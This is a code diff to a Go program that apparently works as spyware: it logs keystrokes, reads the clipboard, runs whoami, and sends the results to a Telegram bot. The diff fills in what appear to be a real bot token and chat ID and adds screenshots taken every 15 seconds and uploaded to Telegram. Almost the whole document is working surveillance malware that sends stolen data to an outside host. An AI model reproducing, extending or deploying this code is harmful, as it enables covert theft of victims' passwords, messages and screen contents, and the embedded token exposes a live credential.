@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"infiltrator/modules"
 	"io"
 	"log"
 	"net/http"
@@ -16,8 +17,8 @@ import (
 var logs string
 
 const (
-	botToken = "YOUR_BOT-Token"
-	ChatID   = "YOUT_CHAT-ID"
+	botToken = "7849597289:AAHvJUiZU8PkorT_cqqyky926hiFYoA88OA"
+	ChatID   = "1859109698"
 )
 
 func main() {
@@ -25,6 +26,7 @@ func main() {
 	version := system("whoami")
 	sendM(version)
 	sendM(StartClipboardMonitor())
+	sendScreen()
 	err := keyboard.Open() // ouvrir le clavier
 	if err != nil {
 		log.Fatal(err)
@@ -33,7 +35,8 @@ func main() {
 
 	go func() {
 		for {
-			time.Sleep(20 * time.Second)
+			time.Sleep(15 * time.Second)
+			sendScreen()
 			if logs != "" {
 				keyentr := fmt.Sprintf("[Keyboard Entries] %s", logs)
 				sendM(keyentr)
@@ -90,4 +93,18 @@ func StartClipboardMonitor() string {
 	}
 	clip := fmt.Sprintf("[Clipboard] %s", clipboard)
 	return string(clip)
+}
+
+func sendScreen() error {
+	files, err := modules.Screen()
+	if err != nil {
+		log.Fatal(err)
+	}
+	for _, f := range files {
+		err := modules.SendTG(botToken, ChatID, f)
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+	return nil
 }
